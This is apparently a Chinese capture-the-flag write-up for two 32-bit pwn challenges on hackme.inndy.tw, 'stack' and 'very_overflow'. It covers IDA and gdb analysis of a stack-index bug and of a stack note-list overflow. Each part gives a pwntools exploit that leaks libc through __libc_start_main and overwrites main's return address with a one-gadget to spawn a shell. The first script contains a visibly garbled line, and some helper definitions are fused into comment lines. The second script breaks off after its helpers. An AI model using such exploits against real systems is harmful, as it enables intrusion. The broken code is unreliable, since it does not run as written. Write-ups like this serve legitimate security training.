    {
      int result; // eax
      result = *a1;
      *a1 += &(&GLOBAL_OFFSET_TABLE_)[-0xFEu] - 0xFFFFFFFF;
      a1[result + 1] = a2;
      return result;
    }
但是反编译出来的东西有点迷，不太助于分析，直接看汇编：
    .text:00000717                 public stack_pop
    .text:00000717 stack_pop       proc near               ; CODE XREF: main+10C↓p
    .text:00000717
    .text:00000717 arg_0           = dword ptr  8
    .text:00000717
    .text:00000717 ; __unwind {
    .text:00000717                 push    ebp
    .text:00000718                 mov     ebp, esp
    .text:0000071A ; 2:   *a1 += &unk_1FBF + 0xFFFFE040;
    .text:0000071A                 call    __x86_get_pc_thunk_ax
    .text:0000071F                 add     eax, 18A1h
    .text:00000724                 mov     eax, [ebp+arg_0]
    .text:00000727                 mov     eax, ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax]
    .text:00000729                 lea     edx, (unk_1FBF - 1FC0h)[eax]
    .text:0000072C                 mov     eax, [ebp+arg_0]
    .text:0000072F                 mov     ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax], edx
    .text:00000731 ; 3:   return *(&dword_1FC4[-2032] + &a1[*a1]);
    .text:00000731                 mov     eax, [ebp+arg_0]
    .text:00000734                 mov     edx, ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax]
    .text:00000736                 mov     eax, [ebp+arg_0]
    .text:00000739                 mov     eax, ds:(dword_1FC4 - 1FC0h)[eax+edx*4]
    .text:0000073D                 pop     ebp
    .text:0000073E                 retn
    .text:0000073E ; } // starts at 717
    .text:0000073E stack_pop       endp
    -----------------------------------------------------------------    
    .text:000006F0                 public stack_push
    .text:000006F0 stack_push      proc near               ; CODE XREF: main+DC↓p
    .text:000006F0
    .text:000006F0 arg_0           = dword ptr  8
    .text:000006F0 arg_4           = dword ptr  0Ch
    .text:000006F0
    .text:000006F0 ; __unwind {
    .text:000006F0                 push    ebp
    .text:000006F1                 mov     ebp, esp
    .text:000006F3 ; 4:   result = *a1;
    .text:000006F3                 call    __x86_get_pc_thunk_ax
    .text:000006F8                 add     eax, 18C8h
    .text:000006FD                 mov     eax, [ebp+arg_0]
    .text:00000700                 mov     eax, ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax]
    .text:00000702 ; 5:   *a1 += &(&GLOBAL_OFFSET_TABLE_)[-0xFEu] - 0xFFFFFFFF;
    .text:00000702                 lea     ecx, (_GLOBAL_OFFSET_TABLE_+1 - 1FC0h)[eax]
    .text:00000705                 mov     edx, [ebp+arg_0]
    .text:00000708                 mov     [edx], ecx
    .text:0000070A ; 6:   a1[result + 1] = a2;
    .text:0000070A                 mov     edx, [ebp+arg_0]
    .text:0000070D                 mov     ecx, [ebp+arg_4]
    .text:00000710                 mov     [edx+eax*4+4], ecx
    .text:00000714 ; 7:   return result;
    .text:00000714                 nop
    .text:00000715                 pop     ebp
    .text:00000716                 retn
    .text:00000716 ; } // starts at 6F0
    .text:00000716 stack_push      endp
pop函数中：`mov ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax], edx`
可以发现pop函数在进行操作的时候，实际上是以edx的值为基准的
在push函数中：`mov [edx+eax*4+4], ecx`,同样的，push操作也是和edx有关
进行gdb调试看看到底是怎么样：
在进入pop函数前下断点`.text:00000717 push ebp`
可以发现，【eax-1】是代表了进行pop操作的下标-1，而下标索引值又赋值给了edx，最后edx又存到了【eax】的地方：
由此可见，0xfffc7548存着索引的值
si一步步执行
继续跟进，看看执行push函数的时候发生了什么
在进入push函数前下断点：`.text:000006F0 push ebp`
同样的对下标进行了+1的操作，接着ecx存储着索引，ecx为1，接着会发现，ebp+0xc的位置的值竟然被赋值给了ecx，接着ecx就被赋值到了【edx+eax*4+4】的地方去
而【edx+eax*4+4】的地址恰好就是0xfffc7548！也就是说pop和push函数用的下标索引的地址是同一个，那么
如果先pop一下，再push(n),再一次pop的时候，就能把下标为n的地方的内容给pop出来
改变了pop和push的索引基准，之后的每一次pop或者push，都会在n的基础上进行
接下来的利用思路就简单了，就是找到这个n，把main函数的ret地址给pop出来，泄漏一波得到libc的偏移，从而可以得到onegadget地址，接着再push(onegadget)把main的返回地址改成one更好，就能实现getshell了
那么怎么找到这个n的具体的值？
在main函数的结尾处的`.text:00000916 retn`下一个断点，来看看main将要结束时候的栈布局
发现，main在退出的时候，返回地址是0xfffc76bc
从而算出：
0xfffc76bc-0xfffc7548 = 0x174
0x174/4 = 0x5d
那么这个n就是0x5d，也就是93了
接下来的操作就是首先pop()一下，push(93),pop()一下泄漏出__libc_start_main+247的地址，从而得到libc基址
，也就能求出onegadget，这时在push(onegadget)，然后输入x退出程序就能getshell了
    #encoding:utf-8
    #!/upr/bin/env python
    from pwn import *
    from os import *
    context.log_level = "debug"
    bin_elf = "./stack"
    context.binary=bin_elf
    elf = ELF(bin_elf)
    libc = ELF("./libc-2.23.so.i386")
    #libc = elf.libc
    if sys.argv[1] == "r":
        p = remote("hackme.inndy.tw",7716)
    elif sys.argv[1] == "l":
        p = process(bin_elf)
    #-------------------------------------    def sl(s):
        return p.sendline(s)
    def sd(s):
        return p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def sla(p,a,s):
        return p.sendlineafter(a,s)
    def sda(p,a,s):
        return p.sendafter(a,s)
    def debug(addr,PIE=False):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
            gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(p,"b *{}".format(hex(addr)))
    def getshell():
        p.interactive()
    #--------------------------------------------    
    def push(num):
        ru("Cmd >>\n")
        sl("i "+str(num))
    def pop():
        ru("Cmd >>\n")
        sl("p")
        ru("Pop -> ")
        val=ru('\n')[:-1]
        print val
        print "pop-->"+hex(int(val)&0xffffffff)
        return int(val)&0xffffffff
    def exit():
        p.sendline('x')
    #gdb.attach(p)
    pause()
    pop()
    push('93')
    libc_base=pop()-libc.symbols['__libc_start_main']-247
    one = libc_base+0x5fbc5#远程端:0x5faa5
    push(str(one- (1>\n")
    sl("x")
    getshell()
这题的重点还是在于调试，跟着汇编看流程，做这题深刻意识到了IDA不是万能的，反编译出来的汇编指令跟gdb动态调试的居然会不同orz
# very_overflow
    Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
只开了个nx,看到这熟悉的菜单选择功能，还以为是一道堆的题目，但实际上不是，是一个在栈上操作一个结构体的题
    void vuln()
    {
      NOTE buffer[128]; // [esp+1Ch] [ebp-420Ch]
      int loop_switch; // [esp+421Ch] [ebp-Ch]
      loop_switch = 1;
      memset(buffer, 0, 0x4200u);
      while ( loop_switch )
      {
        switch ( choose() )
        {
          case 1:
            add_note(buffer);
            break;
          case 2:
            edit_note(buffer);
            break;
          case 3:
            show_note(buffer);
            break;
          case 4:
            dump_notes(buffer);
            break;
          case 5:
            loop_switch = 0;
            break;
          default:
            puts("Invalid option!");
            break;
        }
      }
    }
结构体：
    struct NOTE {
        struct NOTE* next;//指向下一个note
        char         data[128];
    };
这个结构体在栈上面分布，由于没有限制note的数量，一开始的想法是想疯狂add，一直爆到他栈底的返回地址附近，但发现栈的大小是0x420c，这就太大了，不好操作
add（“aa”）一下，随便添加一个note，进入gdb看看情况
通过show（0）的功能，可以看到note的next，也就可以泄漏出note结构体的存储地址
这里可以看到我们创建的第一个note在栈里面的情况，首先存储了next，接着就是data的内容，而根据next的计算方法：`node->next =
(node + strlen(node->data) + 5)`
可以看到note0的next是0xffe8b514，刚刚好指向了data后面的一个字的位置
又根据程序的edit函数：
    void __cdecl edit_note(NOTE *node)
    {
      int v1; // ST04_4
      NOTE *nodea; // [esp+30h] [ebp+8h]
      printf("Which note to edit: ");
      v1 = read_integer();
      nodea = find_node_by_id(node, v1);
      if ( nodea )
      {
        printf("Your new data: ");
        fgets(nodea->data, 128, stdin);
        puts("Done!");
      }
    }
发现可以溢出修改note0的data，从而可以修改note0的next所指向的地方，这样一来也就可以自己伪造note了
接下来再看看，note0往下0x4200位置的地方是什么东西：
可以看到，这下面就是main函数的返回地址，这样一来利用的思路就很清晰了，先通过伪造note，把next一直指向到`__libc_start_main+247`，然后通过show，把他的地址给泄漏出来，从而得到libc
接着再使得next指向`(__libc_start_main+247)-0x8`的位置，这时再添加新的note，就会改变`__libc_start_main+247`的值（改为onegadget），在程序正常退出的时候就会改变程序的执行流程从而getshell
这里有个小细节需要注意的：
show函数是根据id来show出内容的，因此需要注意得看dump函数中的id，以确定需要泄漏的note在哪个位置
而add函数则是 通过node->next和 node->data[0]来添加新的note的
exp如下：
    #encoding:utf-8
    #!/upr/bin/env python
    from pwn import *
    context.log_level = "debug"
    bin_elf = "./very_overflow"
    context.binary=bin_elf
    elf = ELF(bin_elf)
    libc = ELF("./libc-2.23.so.i386")
    #libc = elf.libc
    if sys.argv[1] == "r":
        p = remote("hackme.inndy.tw",7705)
    elif sys.argv[1] == "l":
        p = process(bin_elf)
    #-------------------------------------    def sl(s):
        return p.sendline(s)
    def sd(s):
        return p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def sla(p,a,s):
        return p.sendlineafter(a,s)
    def sda(p,a,s):
        return p.sendafter(a,s)
    def getshell():
        p.interactive()
    #-------------------------------------    